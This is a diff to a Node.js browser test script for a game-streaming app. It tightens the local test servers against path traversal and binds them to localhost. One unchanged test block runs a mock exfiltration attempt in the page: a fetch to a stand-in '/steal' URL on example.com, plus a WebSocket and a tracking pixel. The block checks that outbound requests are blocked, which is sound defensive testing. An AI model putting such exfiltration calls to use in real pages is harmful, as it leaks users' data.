@@ -10,9 +10,9 @@
 import { generateKeyPairSync, sign } from 'node:crypto';
 import { createServer } from 'node:http';
 import { execFileSync } from 'node:child_process';
-import { mkdtempSync, readFileSync, writeFileSync, existsSync } from 'node:fs';
+import { mkdtempSync, readFileSync, existsSync, statSync } from 'node:fs';
 import { tmpdir } from 'node:os';
-import { join, resolve, normalize } from 'node:path';
+import { join, resolve, sep } from 'node:path';
 import { createRequire } from 'node:module';
 
 const require = createRequire(import.meta.url);
@@ -32,22 +32,28 @@ const data = readFileSync(join(GAMES, 'manifest.json'), 'utf8'), m = JSON.parse(
 
 // Build the streaming app pointed at the local games host, with the test public key.
 execFileSync('npx', ['vite', 'build', '--outDir', APP, '--emptyOutDir'], { cwd: ROOT, stdio: 'inherit',
-  env: { ...process.env, VITE_GAMES_URL: 'http://localhost:4192', VITE_CATALOGUE_KEY: pub, VITE_HEARTS_URL: '' } });
+  env: { ...process.env, VITE_GAMES_URL: 'http://127.0.0.1:4192', VITE_CATALOGUE_KEY: pub, VITE_HEARTS_URL: '' } });
 
-// The games host. `served` overrides files for a scenario.
+// A file under `root` for a request path, or null (no escaping the folder with ../ or an absolute path).
+const inside = (root, url) => {
+  const f = resolve(root, '.' + decodeURIComponent(url.split('?')[0]));
+  return f.startsWith(root + sep) && existsSync(f) && statSync(f).isFile() ? f : null;
+};
+const TYPES = { js: 'text/javascript', css: 'text/css', html: 'text/html', json: 'application/json', svg: 'image/svg+xml', woff2: 'font/woff2', png: 'image/png' };
+
+// The games host (localhost only). `served` overrides files for a scenario.
 let served = {};
 const host = createServer((req, res) => {
-  const path = normalize(decodeURIComponent(req.url.split('?')[0])).replace(/^\/+/, '');
-  const body = served[path] ?? (existsSync(join(GAMES, path)) && !path.includes('..') ? readFileSync(join(GAMES, path)) : null);
-  res.writeHead(body == null ? 404 : 200, { 'Access-Control-Allow-Origin': '*', 'Content-Type': path.endsWith('.json') ? 'application/json' : 'text/javascript' });
+  const key = decodeURIComponent(req.url.split('?')[0]).replace(/^\/+/, ''), f = inside(GAMES, req.url);
+  const body = served[key] ?? (f ? readFileSync(f) : null);
+  res.writeHead(body == null ? 404 : 200, { 'Access-Control-Allow-Origin': '*', 'Content-Type': key.endsWith('.json') ? 'application/json' : 'text/javascript' });
   res.end(body ?? 'not found');
-}).listen(4192);
+}).listen(4192, '127.0.0.1');
 const appServer = createServer((req, res) => {
-  let path = normalize(decodeURIComponent(req.url.split('?')[0])).replace(/^\/+/, '') || 'index.html';
-  const f = join(APP, path), ok = !path.includes('..') && existsSync(f) && !f.endsWith('/');
-  const type = { js: 'text/javascript', css: 'text/css', html: 'text/html', json: 'application/json', svg: 'image/svg+xml', woff2: 'font/woff2', png: 'image/png' }[f.split('.').pop()] || 'application/octet-stream';
-  res.writeHead(ok ? 200 : 404, { 'Content-Type': type }); res.end(ok ? readFileSync(f) : '');
-}).listen(4191);
+  const f = inside(APP, req.url === '/' ? '/index.html' : req.url);
+  res.writeHead(f ? 200 : 404, { 'Content-Type': (f && TYPES[f.split('.').pop()]) || 'application/octet-stream' });
+  res.end(f ? readFileSync(f) : '');
+}).listen(4191, '127.0.0.1');
 
 const b = await chromium.launch();
 let fails = 0;
@@ -56,7 +62,7 @@ const check = (ok, label) => { if (!ok) fails++; console.log(ok ? 'PASS' : 'FAIL
 async function open(files = {}, keepPage) {
   served = files;
   const page = keepPage || await (await b.newContext({ viewport: { width: 390, height: 844 } })).newPage();
-  if (!keepPage) await page.goto('http://localhost:4191/'); else await page.reload();
+  if (!keepPage) await page.goto('http://127.0.0.1:4191/'); else await page.reload();
   await page.waitForTimeout(2500);
   return page;
 }
@@ -107,7 +113,7 @@ const net = await p.evaluate(async () => {
   const out = { fetch: await tryIt(() => fetch('https://example.com/steal?x=1')) };
   try { new WebSocket('wss://example.com'); } catch (_) {}
   const img = new Image(); img.src = 'https://example.com/pixel.gif';
-  out.ours = await tryIt(() => fetch('http://localhost:4192/manifest.json'));
+  out.ours = await tryIt(() => fetch('http://127.0.0.1:4192/manifest.json'));
   await new Promise(r => setTimeout(r, 500));
   return { ...out, violations };
 });
